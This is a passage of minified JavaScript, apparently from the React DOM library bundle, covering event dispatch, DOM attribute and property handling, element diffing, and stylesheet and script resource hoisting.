if(Mo(g))if(Ho)Se=dm;else{Se=om;var Y=um}else v=g.nodeName,!v||v.toLowerCase()!=="input"||g.type!=="checkbox"&&g.type!=="radio"?y&&Ys(y.elementType)&&(Se=_o):Se=rm;if(Se&&(Se=Se(e,y))){Do(A,Se,a,x);break e}Y&&Y(e,g,y),e==="focusout"&&y&&g.type==="number"&&y.memoizedProps.value!=null&&Bs(g,"number",g.value)}switch(Y=y?sa(y):window,e){case"focusin":(Mo(Y)||Y.contentEditable==="true")&&(Ml=Y,ec=y,Tn=null);break;case"focusout":Tn=ec=Ml=null;break;case"mousedown":tc=!0;break;case"contextmenu":case"mouseup":case"dragend":tc=!1,Vo(A,a,x);break;case"selectionchange":if(hm)break;case"keydown":case"keyup":Vo(A,a,x)}var ne;if(Fs)e:{switch(e){case"compositionstart":var pe="onCompositionStart";break e;case"compositionend":pe="onCompositionEnd";break e;case"compositionupdate":pe="onCompositionUpdate";break e}pe=void 0}else kl?zo(e,a)&&(pe="onCompositionEnd"):e==="keydown"&&a.keyCode===229&&(pe="onCompositionStart");pe&&(Eo&&a.locale!=="ko"&&(kl||pe!=="onCompositionStart"?pe==="onCompositionEnd"&&kl&&(ne=To()):(Aa=x,Qs="value"in Aa?Aa.value:Aa.textContent,kl=!0)),Y=fs(y,pe),0<Y.length&&(pe=new jo(pe,e,null,a,x),A.push({event:pe,listeners:Y}),ne?pe.data=ne:(ne=ko(a),ne!==null&&(pe.data=ne)))),(ne=lm?nm(e,a):im(e,a))&&(pe=fs(y,"onBeforeInput"),0<pe.length&&(Y=new jo("onBeforeInput","beforeinput",null,a,x),A.push({event:Y,listeners:pe}),Y.data=ne)),Fm(A,e,y,a,x)}yf(A,t)})}function Zn(e,t,a){return{instance:e,listener:t,currentTarget:a}}function fs(e,t){for(var a=t+"Capture",l=[];e!==null;){var n=e,i=n.stateNode;if(n=n.tag,n!==5&&n!==26&&n!==27||i===null||(n=mn(e,a),n!=null&&l.unshift(Zn(e,n,i)),n=mn(e,t),n!=null&&l.push(Zn(e,n,i))),e.tag===3)return l;e=e.return}return[]}function ep(e){if(e===null)return null;do e=e.return;while(e&&e.tag!==5&&e.tag!==27);return e||null}function vf(e,t,a,l,n){for(var i=t._reactName,c=[];a!==null&&a!==l;){var u=a,r=u.alternate,y=u.stateNode;if(u=u.tag,r!==null&&r===l)break;u!==5&&u!==26&&u!==27||y===null||(r=y,n?(y=mn(a,i),y!=null&&c.unshift(Zn(a,y,r))):n||(y=mn(a,i),y!=null&&c.push(Zn(a,y,r)))),a=a.return}c.length!==0&&e.push({event:t,listeners:c})}var tp=/\r\n?/g,ap=/\u0000|\uFFFD/g;function Sf(e){return(typeof e=="string"?e:""+e).replace(tp,`
`).replace(ap,"")}function bf(e,t){return t=Sf(t),Sf(e)===t}function Oe(e,t,a,l,n,i){switch(a){case"children":typeof l=="string"?t==="body"||t==="textarea"&&l===""||wl(e,l):(typeof l=="number"||typeof l=="bigint")&&t!=="body"&&wl(e,""+l);break;case"className":yi(e,"class",l);break;case"tabIndex":yi(e,"tabindex",l);break;case"dir":case"role":case"viewBox":case"width":case"height":yi(e,a,l);break;case"style":So(e,l,i);break;case"data":if(t!=="object"){yi(e,"data",l);break}case"src":case"href":if(l===""&&(t!=="a"||a!=="href")){e.removeAttribute(a);break}if(l==null||typeof l=="function"||typeof l=="symbol"||typeof l=="boolean"){e.removeAttribute(a);break}l=vi(""+l),e.setAttribute(a,l);break;case"action":case"formAction":if(typeof l=="function"){e.setAttribute(a,"javascript:throw new Error('A React form was unexpectedly submitted. If you called form.submit() manually, consider using form.requestSubmit() instead. If you\\'re trying to use event.stopPropagation() in a submit event handler, consider also calling event.preventDefault().')");break}else typeof i=="function"&&(a==="formAction"?(t!=="input"&&Oe(e,t,"name",n.name,n,null),Oe(e,t,"formEncType",n.formEncType,n,null),Oe(e,t,"formMethod",n.formMethod,n,null),Oe(e,t,"formTarget",n.formTarget,n,null)):(Oe(e,t,"encType",n.encType,n,null),Oe(e,t,"method",n.method,n,null),Oe(e,t,"target",n.target,n,null)));if(l==null||typeof l=="symbol"||typeof l=="boolean"){e.removeAttribute(a);break}l=vi(""+l),e.setAttribute(a,l);break;case"onClick":l!=null&&(e.onclick=ua);break;case"onScroll":l!=null&&he("scroll",e);break;case"onScrollEnd":l!=null&&he("scrollend",e);break;case"dangerouslySetInnerHTML":if(l!=null){if(typeof l!="object"||!("__html"in l))throw Error(m(61));if(a=l.__html,a!=null){if(n.children!=null)throw Error(m(60));e.innerHTML=a}}break;case"multiple":e.multiple=l&&typeof l!="function"&&typeof l!="symbol";break;case"muted":e.muted=l&&typeof l!="function"&&typeof l!="symbol";break;case"suppressContentEditableWarning":case"suppressHydrationWarning":case"defaultValue":case"defaultChecked":case"innerHTML":case"ref":break;case"autoFocus":break;case"xlinkHref":if(l==null||typeof l=="function"||typeof l=="boolean"||typeof l=="symbol"){e.removeAttribute("xlink:href");break}a=vi(""+l),e.setAttributeNS("http://www.w3.org/1999/xlink","xlink:href",a);break;case"contentEditable":case"spellCheck":case"draggable":case"value":case"autoReverse":case"externalResourcesRequired":case"focusable":case"preserveAlpha":l!=null&&typeof l!="function"&&typeof l!="symbol"?e.setAttribute(a,""+l):e.removeAttribute(a);break;case"inert":case"allowFullScreen":case"async":case"autoPlay":case"controls":case"default":case"defer":case"disabled":case"disablePictureInPicture":case"disableRemotePlayback":case"formNoValidate":case"hidden":case"loop":case"noModule":case"noValidate":case"open":case"playsInline":case"readOnly":case"required":case"reversed":case"scoped":case"seamless":case"itemScope":l&&typeof l!="function"&&typeof l!="symbol"?e.setAttribute(a,""):e.removeAttribute(a);break;case"capture":case"download":l===!0?e.setAttribute(a,""):l!==!1&&l!=null&&typeof l!="function"&&typeof l!="symbol"?e.setAttribute(a,l):e.removeAttribute(a);break;case"cols":case"rows":case"size":case"span":l!=null&&typeof l!="function"&&typeof l!="symbol"&&!isNaN(l)&&1<=l?e.setAttribute(a,l):e.removeAttribute(a);break;case"rowSpan":case"start":l==null||typeof l=="function"||typeof l=="symbol"||isNaN(l)?e.removeAttribute(a):e.setAttribute(a,l);break;case"popover":he("beforetoggle",e),he("toggle",e),pi(e,"popover",l);break;case"xlinkActuate":ca(e,"http://www.w3.org/1999/xlink","xlink:actuate",l);break;case"xlinkArcrole":ca(e,"http://www.w3.org/1999/xlink","xlink:arcrole",l);break;case"xlinkRole":ca(e,"http://www.w3.org/1999/xlink","xlink:role",l);break;case"xlinkShow":ca(e,"http://www.w3.org/1999/xlink","xlink:show",l);break;case"xlinkTitle":ca(e,"http://www.w3.org/1999/xlink","xlink:title",l);break;case"xlinkType":ca(e,"http://www.w3.org/1999/xlink","xlink:type",l);break;case"xmlBase":ca(e,"http://www.w3.org/XML/1998/namespace","xml:base",l);break;case"xmlLang":ca(e,"http://www.w3.org/XML/1998/namespace","xml:lang",l);break;case"xmlSpace":ca(e,"http://www.w3.org/XML/1998/namespace","xml:space",l);break;case"is":pi(e,"is",l);break;case"innerText":case"textContent":break;default:(!(2<a.length)||a[0]!=="o"&&a[0]!=="O"||a[1]!=="n"&&a[1]!=="N")&&(a=zh.get(a)||a,pi(e,a,l))}}function Au(e,t,a,l,n,i){switch(a){case"style":So(e,l,i);break;case"dangerouslySetInnerHTML":if(l!=null){if(typeof l!="object"||!("__html"in l))throw Error(m(61));if(a=l.__html,a!=null){if(n.children!=null)throw Error(m(60));e.innerHTML=a}}break;case"children":typeof l=="string"?wl(e,l):(typeof l=="number"||typeof l=="bigint")&&wl(e,""+l);break;case"onScroll":l!=null&&he("scroll",e);break;case"onScrollEnd":l!=null&&he("scrollend",e);break;case"onClick":l!=null&&(e.onclick=ua);break;case"suppressContentEditableWarning":case"suppressHydrationWarning":case"innerHTML":case"ref":break;case"innerText":case"textContent":break;default:if(!oo.hasOwnProperty(a))e:{if(a[0]==="o"&&a[1]==="n"&&(n=a.endsWith("Capture"),t=a.slice(2,n?a.length-7:void 0),i=e[de]||null,i=i!=null?i[a]:null,typeof i=="function"&&e.removeEventListener(t,i,n),typeof l=="function")){typeof i!="function"&&i!==null&&(a in e?e[a]=null:e.hasAttribute(a)&&e.removeAttribute(a)),e.addEventListener(t,l,n);break e}a in e?e[a]=l:l===!0?e.setAttribute(a,""):pi(e,a,l)}}}function rt(e,t,a){switch(t){case"div":case"span":case"svg":case"path":case"a":case"g":case"p":case"li":break;case"img":he("error",e),he("load",e);var l=!1,n=!1,i;for(i in a)if(a.hasOwnProperty(i)){var c=a[i];if(c!=null)switch(i){case"src":l=!0;break;case"srcSet":n=!0;break;case"children":case"dangerouslySetInnerHTML":throw Error(m(137,t));default:Oe(e,t,i,c,a,null)}}n&&Oe(e,t,"srcSet",a.srcSet,a,null),l&&Oe(e,t,"src",a.src,a,null);return;case"input":he("invalid",e);var u=i=c=n=null,r=null,y=null;for(l in a)if(a.hasOwnProperty(l)){var x=a[l];if(x!=null)switch(l){case"name":n=x;break;case"type":c=x;break;case"checked":r=x;break;case"defaultChecked":y=x;break;case"value":i=x;break;case"defaultValue":u=x;break;case"children":case"dangerouslySetInnerHTML":if(x!=null)throw Error(m(137,t));break;default:Oe(e,t,l,x,a,null)}}po(e,i,u,r,y,c,n,!1);return;case"select":he("invalid",e),l=c=i=null;for(n in a)if(a.hasOwnProperty(n)&&(u=a[n],u!=null))switch(n){case"value":i=u;break;case"defaultValue":c=u;break;case"multiple":l=u;default:Oe(e,t,n,u,a,null)}t=i,a=c,e.multiple=!!l,t!=null?El(e,!!l,t,!1):a!=null&&El(e,!!l,a,!0);return;case"textarea":he("invalid",e),i=n=l=null;for(c in a)if(a.hasOwnProperty(c)&&(u=a[c],u!=null))switch(c){case"value":l=u;break;case"defaultValue":n=u;break;case"children":i=u;break;case"dangerouslySetInnerHTML":if(u!=null)throw Error(m(91));break;default:Oe(e,t,c,u,a,null)}go(e,l,n,i);return;case"option":for(r in a)a.hasOwnProperty(r)&&(l=a[r],l!=null)&&(r==="selected"?e.selected=l&&typeof l!="function"&&typeof l!="symbol":Oe(e,t,r,l,a,null));return;case"dialog":he("beforetoggle",e),he("toggle",e),he("cancel",e),he("close",e);break;case"iframe":case"object":he("load",e);break;case"video":case"audio":for(l=0;l<Kn.length;l++)he(Kn[l],e);break;case"image":he("error",e),he("load",e);break;case"details":he("toggle",e);break;case"embed":case"source":case"link":he("error",e),he("load",e);case"area":case"base":case"br":case"col":case"hr":case"keygen":case"meta":case"param":case"track":case"wbr":case"menuitem":for(y in a)if(a.hasOwnProperty(y)&&(l=a[y],l!=null))switch(y){case"children":case"dangerouslySetInnerHTML":throw Error(m(137,t));default:Oe(e,t,y,l,a,null)}return;default:if(Ys(t)){for(x in a)a.hasOwnProperty(x)&&(l=a[x],l!==void 0&&Au(e,t,x,l,a,void 0));return}}for(u in a)a.hasOwnProperty(u)&&(l=a[u],l!=null&&Oe(e,t,u,l,a,null))}function lp(e,t,a,l){switch(t){case"div":case"span":case"svg":case"path":case"a":case"g":case"p":case"li":break;case"input":var n=null,i=null,c=null,u=null,r=null,y=null,x=null;for(v in a){var A=a[v];if(a.hasOwnProperty(v)&&A!=null)switch(v){case"checked":break;case"value":break;case"defaultValue":r=A;default:l.hasOwnProperty(v)||Oe(e,t,v,null,l,A)}}for(var g in l){var v=l[g];if(A=a[g],l.hasOwnProperty(g)&&(v!=null||A!=null))switch(g){case"type":i=v;break;case"name":n=v;break;case"checked":y=v;break;case"defaultChecked":x=v;break;case"value":c=v;break;case"defaultValue":u=v;break;case"children":case"dangerouslySetInnerHTML":if(v!=null)throw Error(m(137,t));break;default:v!==A&&Oe(e,t,g,v,l,A)}}Us(e,c,u,r,y,x,i,n);return;case"select":v=c=u=g=null;for(i in a)if(r=a[i],a.hasOwnProperty(i)&&r!=null)switch(i){case"value":break;case"multiple":v=r;default:l.hasOwnProperty(i)||Oe(e,t,i,null,l,r)}for(n in l)if(i=l[n],r=a[n],l.hasOwnProperty(n)&&(i!=null||r!=null))switch(n){case"value":g=i;break;case"defaultValue":u=i;break;case"multiple":c=i;default:i!==r&&Oe(e,t,n,i,l,r)}t=u,a=c,l=v,g!=null?El(e,!!a,g,!1):!!l!=!!a&&(t!=null?El(e,!!a,t,!0):El(e,!!a,a?[]:"",!1));return;case"textarea":v=g=null;for(u in a)if(n=a[u],a.hasOwnProperty(u)&&n!=null&&!l.hasOwnProperty(u))switch(u){case"value":break;case"children":break;default:Oe(e,t,u,null,l,n)}for(c in l)if(n=l[c],i=a[c],l.hasOwnProperty(c)&&(n!=null||i!=null))switch(c){case"value":g=n;break;case"defaultValue":v=n;break;case"children":break;case"dangerouslySetInnerHTML":if(n!=null)throw Error(m(91));break;default:n!==i&&Oe(e,t,c,n,l,i)}yo(e,g,v);return;case"option":for(var U in a)g=a[U],a.hasOwnProperty(U)&&g!=null&&!l.hasOwnProperty(U)&&(U==="selected"?e.selected=!1:Oe(e,t,U,null,l,g));for(r in l)g=l[r],v=a[r],l.hasOwnProperty(r)&&g!==v&&(g!=null||v!=null)&&(r==="selected"?e.selected=g&&typeof g!="function"&&typeof g!="symbol":Oe(e,t,r,g,l,v));return;case"img":case"link":case"area":case"base":case"br":case"col":case"embed":case"hr":case"keygen":case"meta":case"param":case"source":case"track":case"wbr":case"menuitem":for(var W in a)g=a[W],a.hasOwnProperty(W)&&g!=null&&!l.hasOwnProperty(W)&&Oe(e,t,W,null,l,g);for(y in l)if(g=l[y],v=a[y],l.hasOwnProperty(y)&&g!==v&&(g!=null||v!=null))switch(y){case"children":case"dangerouslySetInnerHTML":if(g!=null)throw Error(m(137,t));break;default:Oe(e,t,y,g,l,v)}return;default:if(Ys(t)){for(var ze in a)g=a[ze],a.hasOwnProperty(ze)&&g!==void 0&&!l.hasOwnProperty(ze)&&Au(e,t,ze,void 0,l,g);for(x in l)g=l[x],v=a[x],!l.hasOwnProperty(x)||g===v||g===void 0&&v===void 0||Au(e,t,x,g,l,v);return}}for(var h in a)g=a[h],a.hasOwnProperty(h)&&g!=null&&!l.hasOwnProperty(h)&&Oe(e,t,h,null,l,g);for(A in l)g=l[A],v=a[A],!l.hasOwnProperty(A)||g===v||g==null&&v==null||Oe(e,t,A,g,l,v)}function xf(e){switch(e){case"css":case"script":case"font":case"img":case"image":case"input":case"link":return!0;default:return!1}}function np(){if(typeof performance.getEntriesByType=="function"){for(var e=0,t=0,a=performance.getEntriesByType("resource"),l=0;l<a.length;l++){var n=a[l],i=n.transferSize,c=n.initiatorType,u=n.duration;if(i&&u&&xf(c)){for(c=0,u=n.responseEnd,l+=1;l<a.length;l++){var r=a[l],y=r.startTime;if(y>u)break;var x=r.transferSize,A=r.initiatorType;x&&xf(A)&&(r=r.responseEnd,c+=x*(r<u?1:(u-y)/(r-y)))}if(--l,t+=8*(i+c)/(n.duration/1e3),e++,10<e)break}}if(0<e)return t/e/1e6}return navigator.connection&&(e=navigator.connection.downlink,typeof e=="number")?e:5}var Eu=null,wu=null;function hs(e){return e.nodeType===9?e:e.ownerDocument}function Tf(e){switch(e){case"http://www.w3.org/2000/svg":return 1;case"http://www.w3.org/1998/Math/MathML":return 2;default:return 0}}function Nf(e,t){if(e===0)switch(t){case"svg":return 1;case"math":return 2;default:return 0}return e===1&&t==="foreignObject"?0:e}function Ou(e,t){return e==="textarea"||e==="noscript"||typeof t.children=="string"||typeof t.children=="number"||typeof t.children=="bigint"||typeof t.dangerouslySetInnerHTML=="object"&&t.dangerouslySetInnerHTML!==null&&t.dangerouslySetInnerHTML.__html!=null}var zu=null;function ip(){var e=window.event;return e&&e.type==="popstate"?e===zu?!1:(zu=e,!0):(zu=null,!1)}var Cf=typeof setTimeout=="function"?setTimeout:void 0,sp=typeof clearTimeout=="function"?clearTimeout:void 0,jf=typeof Promise=="function"?Promise:void 0,cp=typeof queueMicrotask=="function"?queueMicrotask:typeof jf<"u"?function(e){return jf.resolve(null).then(e).catch(up)}:Cf;function up(e){setTimeout(function(){throw e})}function Va(e){return e==="head"}function Af(e,t){var a=t,l=0;do{var n=a.nextSibling;if(e.removeChild(a),n&&n.nodeType===8)if(a=n.data,a==="/$"||a==="/&"){if(l===0){e.removeChild(n),sn(t);return}l--}else if(a==="$"||a==="$?"||a==="$~"||a==="$!"||a==="&")l++;else if(a==="html")Wn(e.ownerDocument.documentElement);else if(a==="head"){a=e.ownerDocument.head,Wn(a);for(var i=a.firstChild;i;){var c=i.nextSibling,u=i.nodeName;i[Pa]||u==="SCRIPT"||u==="STYLE"||u==="LINK"&&i.rel.toLowerCase()==="stylesheet"||a.removeChild(i),i=c}}else a==="body"&&Wn(e.ownerDocument.body);a=n}while(a);sn(t)}function Ef(e,t){var a=e;e=0;do{var l=a.nextSibling;if(a.nodeType===1?t?(a._stashedDisplay=a.style.display,a.style.display="none"):(a.style.display=a._stashedDisplay||"",a.getAttribute("style")===""&&a.removeAttribute("style")):a.nodeType===3&&(t?(a._stashedText=a.nodeValue,a.nodeValue=""):a.nodeValue=a._stashedText||""),l&&l.nodeType===8)if(a=l.data,a==="/$"){if(e===0)break;e--}else a!=="$"&&a!=="$?"&&a!=="$~"&&a!=="$!"||e++;a=l}while(a)}function ku(e){var t=e.firstChild;for(t&&t.nodeType===10&&(t=t.nextSibling);t;){var a=t;switch(t=t.nextSibling,a.nodeName){case"HTML":case"HEAD":case"BODY":ku(a),Pe(a);continue;case"SCRIPT":case"STYLE":continue;case"LINK":if(a.rel.toLowerCase()==="stylesheet")continue}e.removeChild(a)}}function op(e,t,a,l){for(;e.nodeType===1;){var n=a;if(e.nodeName.toLowerCase()!==t.toLowerCase()){if(!l&&(e.nodeName!=="INPUT"||e.type!=="hidden"))break}else if(l){if(!e[Pa])switch(t){case"meta":if(!e.hasAttribute("itemprop"))break;return e;case"link":if(i=e.getAttribute("rel"),i==="stylesheet"&&e.hasAttribute("data-precedence"))break;if(i!==n.rel||e.getAttribute("href")!==(n.href==null||n.href===""?null:n.href)||e.getAttribute("crossorigin")!==(n.crossOrigin==null?null:n.crossOrigin)||e.getAttribute("title")!==(n.title==null?null:n.title))break;return e;case"style":if(e.hasAttribute("data-precedence"))break;return e;case"script":if(i=e.getAttribute("src"),(i!==(n.src==null?null:n.src)||e.getAttribute("type")!==(n.type==null?null:n.type)||e.getAttribute("crossorigin")!==(n.crossOrigin==null?null:n.crossOrigin))&&i&&e.hasAttribute("async")&&!e.hasAttribute("itemprop"))break;return e;default:return e}}else if(t==="input"&&e.type==="hidden"){var i=n.name==null?null:""+n.name;if(n.type==="hidden"&&e.getAttribute("name")===i)return e}else return e;if(e=Vt(e.nextSibling),e===null)break}return null}function rp(e,t,a){if(t==="")return null;for(;e.nodeType!==3;)if((e.nodeType!==1||e.nodeName!=="INPUT"||e.type!=="hidden")&&!a||(e=Vt(e.nextSibling),e===null))return null;return e}function wf(e,t){for(;e.nodeType!==8;)if((e.nodeType!==1||e.nodeName!=="INPUT"||e.type!=="hidden")&&!t||(e=Vt(e.nextSibling),e===null))return null;return e}function Mu(e){return e.data==="$?"||e.data==="$~"}function Du(e){return e.data==="$!"||e.data==="$?"&&e.ownerDocument.readyState!=="loading"}function dp(e,t){var a=e.ownerDocument;if(e.data==="$~")e._reactRetry=t;else if(e.data!=="$?"||a.readyState!=="loading")t();else{var l=function(){t(),a.removeEventListener("DOMContentLoaded",l)};a.addEventListener("DOMContentLoaded",l),e._reactRetry=l}}function Vt(e){for(;e!=null;e=e.nextSibling){var t=e.nodeType;if(t===1||t===3)break;if(t===8){if(t=e.data,t==="$"||t==="$!"||t==="$?"||t==="$~"||t==="&"||t==="F!"||t==="F")break;if(t==="/$"||t==="/&")return null}}return e}var _u=null;function Of(e){e=e.nextSibling;for(var t=0;e;){if(e.nodeType===8){var a=e.data;if(a==="/$"||a==="/&"){if(t===0)return Vt(e.nextSibling);t--}else a!=="$"&&a!=="$!"&&a!=="$?"&&a!=="$~"&&a!=="&"||t++}e=e.nextSibling}return null}function zf(e){e=e.previousSibling;for(var t=0;e;){if(e.nodeType===8){var a=e.data;if(a==="$"||a==="$!"||a==="$?"||a==="$~"||a==="&"){if(t===0)return e;t--}else a!=="/$"&&a!=="/&"||t++}e=e.previousSibling}return null}function kf(e,t,a){switch(t=hs(a),e){case"html":if(e=t.documentElement,!e)throw Error(m(452));return e;case"head":if(e=t.head,!e)throw Error(m(453));return e;case"body":if(e=t.body,!e)throw Error(m(454));return e;default:throw Error(m(451))}}function Wn(e){for(var t=e.attributes;t.length;)e.removeAttributeNode(t[0]);Pe(e)}var Xt=new Map,Mf=new Set;function ms(e){return typeof e.getRootNode=="function"?e.getRootNode():e.nodeType===9?e:e.ownerDocument}var Ca=k.d;k.d={f:fp,r:hp,D:mp,C:pp,L:yp,m:gp,X:Sp,S:vp,M:bp};function fp(){var e=Ca.f(),t=is();return e||t}function hp(e){var t=ia(e);t!==null&&t.tag===5&&t.type==="form"?Wr(t):Ca.r(e)}var an=typeof document>"u"?null:document;function Df(e,t,a){var l=an;if(l&&typeof t=="string"&&t){var n=Rt(t);n='link[rel="'+e+'"][href="'+n+'"]',typeof a=="string"&&(n+='[crossorigin="'+a+'"]'),Mf.has(n)||(Mf.add(n),e={rel:e,crossOrigin:a,href:t},l.querySelector(n)===null&&(t=l.createElement("link"),rt(t,"link",e),nt(t),l.head.appendChild(t)))}}function mp(e){Ca.D(e),Df("dns-prefetch",e,null)}function pp(e,t){Ca.C(e,t),Df("preconnect",e,t)}function yp(e,t,a){Ca.L(e,t,a);var l=an;if(l&&e&&t){var n='link[rel="preload"][as="'+Rt(t)+'"]';t==="image"&&a&&a.imageSrcSet?(n+='[imagesrcset="'+Rt(a.imageSrcSet)+'"]',typeof a.imageSizes=="string"&&(n+='[imagesizes="'+Rt(a.imageSizes)+'"]')):n+='[href="'+Rt(e)+'"]';var i=n;switch(t){case"style":i=ln(e);break;case"script":i=nn(e)}Xt.has(i)||(e=Q({rel:"preload",href:t==="image"&&a&&a.imageSrcSet?void 0:e,as:t},a),Xt.set(i,e),l.querySelector(n)!==null||t==="style"&&l.querySelector(Jn(i))||t==="script"&&l.querySelector(Fn(i))||(t=l.createElement("link"),rt(t,"link",e),nt(t),l.head.appendChild(t)))}}function gp(e,t){Ca.m(e,t);var a=an;if(a&&e){var l=t&&typeof t.as=="string"?t.as:"script",n='link[rel="modulepreload"][as="'+Rt(l)+'"][href="'+Rt(e)+'"]',i=n;switch(l){case"audioworklet":case"paintworklet":case"serviceworker":case"sharedworker":case"worker":case"script":i=nn(e)}if(!Xt.has(i)&&(e=Q({rel:"modulepreload",href:e},t),Xt.set(i,e),a.querySelector(n)===null)){switch(l){case"audioworklet":case"paintworklet":case"serviceworker":case"sharedworker":case"worker":case"script":if(a.querySelector(Fn(i)))return}l=a.createElement("link"),rt(l,"link",e),nt(l),a.head.appendChild(l)}}}function vp(e,t,a){Ca.S(e,t,a);var l=an;if(l&&e){var n=jl(l).hoistableStyles,i=ln(e);t=t||"default";var c=n.get(i);if(!c){var u={loading:0,preload:null};if(c=l.querySelector(Jn(i)))u.loading=5;else{e=Q({rel:"stylesheet",href:e,"data-precedence":t},a),(a=Xt.get(i))&&Hu(e,a);var r=c=l.createElement("link");nt(r),rt(r,"link",e),r._p=new Promise(function(y,x){r.onload=y,r.onerror=x}),r.addEventListener("load",function(){u.loading|=1}),r.addEventListener("error",function(){u.loading|=2}),u.loading|=4,ps(c,t,l)}c={type:"stylesheet",instance:c,count:1,state:u},n.set(i,c)}}}function Sp(e,t){Ca.X(e,t);var a=an;if(a&&e){var l=jl(a).hoistableScripts,n=nn(e),i=l.get(n);i||(i=a.querySelector(Fn(n)),i||(e=Q({src:e,async:!0},t),(t=Xt.get(n))&&Ru(e,t),i=a.createElement("script"),nt(i),rt(i,"link",e),a.head.appendChild(i)),i={type:"script",instance:i,count:1,state:null},l.set(n,i))}}function bp(e,t){Ca.M(e,t);var a=an;if(a&&e){var l=jl(a).hoistableScripts,n=nn(e),i=l.get(n);i||(i=a.querySelector(Fn(n)),i||(e=Q({src:e,async:!0,type:"module"},t),(t=Xt.get(n))&&Ru(e,t),i=a.createElement("script"),nt(i),rt(i,"link",e),a.head.appendChild(i)),i={type:"script",instance:i,count:1,state:null},l.set(n,i))}}function _f(e,t,a,l){var n=(n=ie.current)?ms(n):null;if(!n)throw Error(m(446));switch(e){case"meta":case"title":return null;case"style":return typeof a.precedence=="string"&&typeof a.href=="string"?(t=ln(a.href),a=jl(n).hoistableStyles,l=a.get(t),l||(l={type:"style",instance:null,count:0,state:null},a.set(t,l)),l):{type:"void",instance:null,count:0,state:null};case"link":if(a.rel==="stylesheet"&&typeof a.href=="string"&&typeof a.precedence=="string"){e=ln(a.href);var i=jl(n).hoistableStyles,c=i.get(e);if(c||(n=n.ownerDocument||n,c={type:"stylesheet",instance:null,count:0,state:{loading:0,preload:null}},i.set(e,c),(i=n.querySelector(Jn(e)))&&!i._p&&(c.instance=i,c.state.loading=5),Xt.has(e)||(a={rel:"preload",as:"style",href:a.href,crossOrigin:a.crossOrigin,integrity:a.integrity,media:a.media,hrefLang:a.hrefLang,referrerPolicy:a.referrerPolicy},Xt.set(e,a),i||xp(n,e,a,c.state))),t&&l===null)throw Error(m(528,""));return c}if(t&&l!==null)throw Error(m(529,""));return null;case"script":return t=a.async,a=a.src,typeof a=="string"&&t&&typeof t!="function"&&typeof t!="symbol"?(t=nn(a),a=jl(n).hoistableScripts,l=a.get(t),l||(l={type:"script",instance:null,count:0,state:null},a.set(t,l)),l):{type:"void",instance:null,count:0,state:null};default:throw Error(m(444,e))}}function ln(e){return'href="'+Rt(e)+'"'}function Jn(e){return'link[rel="stylesheet"]['+e+"]"}function Hf(e){return Q({},e,{"data-precedence":e.precedence,precedence:null})}function xp(e,t,a,l){e.querySelector('link[rel="preload"][as="style"]['+t+"]")?l.loading=1:(t=e.createElement("link"),l.preload=t,t.addEventListener("load",function(){return l.loading|=1}),t.addEventListener("error",function(){return l.loading|=2}),rt(t,"link",a),nt(t),e.head.appendChild(t))}function nn(e){return'[src="'+Rt(e)+'"]'}function Fn(e){return"script[async]"+e}function Rf(e,t,a){if(t.count++,t.instance===null)switch(t.type){case"style":var l=e.querySelector('style[data-href~="'+Rt(a.href)+'"]');if(l)return t.instance=l,nt(l),l;var n=Q({},a,{"data-href":a.href,"data-precedence":a.precedence,href:null,precedence:null});return l=(e.ownerDocument||e).createElement("style"),nt(l),rt(l,"style",n),ps(l,a.precedence,e),t.instance=l;case"stylesheet":n=ln(a.href);var i=e.querySelector(Jn(n));if(i)return t.state.loading|=4,t.instance=i,nt(i),i;l=Hf(a),(n=Xt.get(n))&&Hu(l,n),i=(e.ownerDocument||e).createElement("link"),nt(i);var c=i;return c._p=new Promise(function(u,r){c.onload=u,c.onerror=r}),rt(i,"link",l),t.state.loading|=4,ps(i,a.precedence,e),t.instance=i;case"script":return i=nn(a.src),(n=e.querySelector(Fn(i)))?(t.instance=n,nt(n),n):(l=a,(n=Xt.get(i))&&(l=Q({},a),Ru(l,n)),e=e.ownerDocument||e,n=e.createElement("script"),nt(n),rt(n,"link",l),e.head.appendChild(n),t.instance=n);case"void":return null;default:throw Error(m(443,t.type))}else t.type==="stylesheet"&&(t.state.loading&4)===0&&(l=t.instance,t.state.loading|=4,ps(l,a.precedence,e));return t.instance}function ps(e,t,a){for(var l=a.querySelectorAll('link[rel="stylesheet"][data-precedence],style[data-precedence]'),n=l.length?l[l.length-1]:null,i=n,c=0;c<l.length;c++){var u=l[c];if(u.dataset.precedence===t)i=u;else if(i!==n)break}i?i.parentNode.insertBefore(e,i.nextSibling):(t=a.nodeType===9?a.head:a,t.insertBefore(e,t.firstChild))}function Hu(e,t){e.crossOrigin==null&&(e.crossOrigin=t.crossOrigin),e.referrerPolicy==null&&(e.referrerPolicy=t.referrerPolicy),e.title==null&&(e.title=t.title)}function Ru(e,t){e.crossOrigin==null&&(e.crossOrigin=t.crossOrigin),e.referrerPolicy==null&&(e.referrerPolicy=t.referrerPolicy),e.integrity==null&&(e.integrity=t.integrity)}var ys=null;function Lf(e,t,a){if(ys===null){var l=new Map,n=ys=new Map;n.set(a,l)}else n=ys,l=n.get(a),l||(l=new Map,n.set(a,l));if(l.has(e))return l;for(l.set(e,null),a=a.getElementsByTagName(e),n=0;n<a.length;n++){var i=a[n];if(!(i[Pa]||i[F]||e==="link"&&i.getAttribute("rel")==="stylesheet")&&i.namespaceURI!=="http://www.w3.org/2000/svg"){var c=i.getAttribute(t)||"";c=e+c;var u=l.get(c);u?u.push(i):l.set(c,[i])}}return l}function Uf(e,t,a){e=e.ownerDocument||e,e.head.insertBefore(a,t==="title"?e.querySelector("head > title"):null)}function Tp(e,t,a){if(a===1||t.itemProp!=null)return!1;switch(e){case"meta":case"title":return!0;case"style":if(typeof t.precedence!="string"||typeof t.href!="string"||t.href==="")break;return!0;case"link":if(typeof t.rel!="string"||typeof t.href!="string"||t.href===""||t.onLoad||t.onError)break;return t.rel==="stylesheet"?(e=t.disabled,typeof t.precedence=="string"&&e==null):!0;case"script":if(t.async&&typeof t.async!="function"&&typeof t.async!="symbol"&&!t.onLoad&&!t.onError&&t.src&&typeof t.src=="string")return!0}return!1}function Bf(e){return!(e.type==="stylesheet"&&(e.state.loading&3)===0)}function Np(e,t,a,l){if(a.type==="stylesheet"&&(typeof l.media!="string"||matchMedia(l.media).matches!==!1)&&(a.state.loading&4)===0){if(a.instance===null){var n=ln(l.href),i=t.querySelector(Jn(n));if(i){t=i._p,t!==null&&typeof t=="object"&&typeof t.then=="function"&&(e.count++,e=gs.bind(e),t.then(e,e)),a.state.loading|=4,a.instance=i,nt(i);return}i=t.ownerDocument||t,l=Hf(l),(n=Xt.get(n))&&Hu(l,n),i=i.createElement("link"),nt(i);var c=i;c._p=new 